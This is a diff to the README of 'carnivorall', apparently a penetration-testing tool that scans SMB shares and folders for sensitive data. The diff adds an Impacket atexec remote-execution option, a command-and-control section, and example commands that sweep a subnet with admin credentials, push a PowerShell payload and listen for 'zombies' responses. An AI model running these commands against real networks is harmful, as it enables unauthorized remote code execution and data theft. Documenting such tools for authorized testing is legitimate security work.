@@ -50,12 +50,12 @@ Scan files looking for sensitive information on SMB shares, local folders and pu
 
         -lH, --lhost 192.168.0.1                     Local ip to receive zombies responses
         -lP, --lport 80                              Local port to listen
-        -pP, --pspayload <payload.ps1>                 Powershell payload file
+        -pP, --pspayload <payload.ps1>               Powershell payload file
+        -mT, --method atexec                         Use atexec.py (Default psexec.py from Impacket)
 
-        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 
-            -pP ./payload.ps1 -lP 80 
-        
-        Ex5: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode. 
+        Ex4: ./carnivorall -n 192.168.0.0/24 -u Admin -p Admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 80 
+        Ex5: ./carnivorall.sh -n 192.168.1.1 -u admin -p admin -d COMPANY -lH 192.168.1.2 -pP ./payload.ps1 -lP 8080 -m senha -mT atexec
+        Ex6: ./carnivorall -lH 192.168.1.2 -lP 80 # Listen mode. 
 
 # Requirements:
 
@@ -68,6 +68,13 @@ Scan files looking for sensitive information on SMB shares, local folders and pu
       $ bundle install  --> inside the same dir when gemfile
 - yara (only to use -y option)
 
+# Command & Control Module
+
+To use the command and control module, you need to install Impacket from CoreSecurity
+
+Getting Impacket
+
+* [Current and past releases](https://github.com/CoreSecurity/impacket/releases)
 
 ```
                                ,##############*                                          
